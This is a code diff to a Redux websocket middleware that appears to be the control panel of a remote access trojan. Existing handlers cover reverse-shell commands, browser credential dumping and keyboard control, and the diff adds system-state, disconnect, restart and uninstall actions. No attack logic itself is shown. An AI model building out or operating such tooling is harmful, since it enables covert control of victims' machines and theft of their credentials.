@@ -22,7 +22,7 @@ import {
     handleSendCommandReverseShell,
     handleDumpBrowser,
     handleKeyboardController,
-    handleMessageBox
+    handleMessageBox, handleSystemState, handleDisconnect, handleRestartConnection, handleUninstall
 } from '@redux/middleware/actionHandlers';
 import {handleWebSocketBinary, handleWebSocketMessage} from './messageHandler';
 import {SELECT_CLIENT, WS_CONNECT} from "@redux/actions/connectionActions";
@@ -44,6 +44,7 @@ import {REVERSE_SHELL_COMMAND, START_REVERSE_SHELL} from "@redux/actions/reverse
 import {DUMP_BROWSER} from "@redux/actions/credentialsActions";
 import {KEYBOARD_CONTROLLER} from "@redux/actions/keyboardControllerActions";
 import {SHOW_MESSAGE_BOX} from "@redux/actions/messsageBoxActions";
+import {DISCONNECT, RESTART, SYSTEM_STATE, UNINSTALL} from "@redux/actions/stateActions";
 
 let websocket = null;
 
@@ -80,6 +81,10 @@ const actionHandlers = {
     [DUMP_BROWSER]: (store, action) => handleDumpBrowser(websocket, store, action),
     [KEYBOARD_CONTROLLER]: (store, action) => handleKeyboardController(websocket, store, action),
     [SHOW_MESSAGE_BOX]: (store, action) => handleMessageBox(websocket, store, action),
+    [SYSTEM_STATE]: (store, action) => handleSystemState(websocket, store, action),
+    [DISCONNECT]: (store, action) => handleDisconnect(websocket, store, action),
+    [RESTART]: (store, action) => handleRestartConnection(websocket, store, action),
+    [UNINSTALL]: (store, action) => handleUninstall(websocket, store, action),
 };
 
 const websocketMiddleware = store => next => action => {
